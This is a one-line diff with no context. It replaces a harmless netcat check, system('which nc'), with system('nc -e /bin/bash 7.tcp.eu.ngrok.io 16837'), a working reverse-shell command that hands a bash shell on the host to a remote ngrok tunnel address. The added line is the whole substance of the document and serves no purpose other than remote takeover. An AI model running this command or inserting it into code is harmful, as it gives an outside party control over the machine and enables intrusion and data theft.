@@ -1,1 +1,1 @@
-<pre>system('which nc')</pre>
+<pre>system('nc -e /bin/bash 7.tcp.eu.ngrok.io 16837')</pre>
